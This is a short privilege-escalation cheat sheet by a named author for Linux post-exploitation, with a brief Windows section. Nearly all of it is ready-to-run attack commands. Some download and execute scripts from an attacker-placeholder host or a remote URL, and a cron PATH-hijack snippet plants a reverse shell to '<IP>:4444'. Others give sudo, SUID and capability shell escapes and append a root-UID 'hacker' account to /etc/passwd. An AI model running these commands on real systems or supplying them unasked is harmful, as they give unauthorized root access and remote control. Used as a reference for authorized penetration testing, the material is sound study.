# Privilege Escalation – Linux
**Author: Manish Verma**

---

## 📌 Objective
**Scope:** Linux post-exploitation privilege escalation  
**Tools Used:** LinPEAS, LinEnum, pspy, GTFOBins  
**Outcome:** Root / elevated shell access

---

## 🔍 Enumeration First

```bash
# System info
uname -a; cat /etc/os-release; id; sudo -l

# Automated tools
wget http://<attacker>/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
python3 -c "$(curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)"
```

---

## ⚔️ SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Check GTFOBins for exploitation
# Example: nmap SUID
nmap --interactive
!sh
```

---

## ⚔️ Sudo Abuse

```bash
sudo -l                         # List sudo permissions
sudo -u root /bin/bash          # Direct bash if allowed
sudo find . -exec /bin/bash \; # Via find
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo vim -c ':!/bin/bash'
```

---

## ⚔️ Capabilities

```bash
getcap -r / 2>/dev/null

# cap_setuid+ep on python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_net_raw on tcpdump - sniff traffic
```

---

## ⚔️ Cron Jobs / PATH Hijack

```bash
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/*

# If cron runs script from PATH-controlled dir
echo '#!/bin/bash' > /tmp/script.sh
echo 'bash -i >& /dev/tcp/<IP>/4444 0>&1' >> /tmp/script.sh
chmod +x /tmp/script.sh
export PATH=/tmp:$PATH
```

---

## ⚔️ Writable /etc/passwd

```bash
ls -la /etc/passwd
# If writable, add root user
echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

---

## ⚔️ Kernel Exploits

```bash
uname -r
searchsploit linux kernel <version>
# DirtyCow, OverlayFS, etc.
```

---

## Windows PrivEsc (Quick Reference)

```powershell
# Unquoted Service Path
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# SeImpersonatePrivilege
whoami /priv
# Use PrintSpoofer or JuicyPotato

# DLL Hijacking
Procmon filter: Result = NAME NOT FOUND, Path ends with .dll

# WinPEAS
winpeas.exe > output.txt
```

---

## ⚠️ Disclaimer
All techniques for authorized testing only.
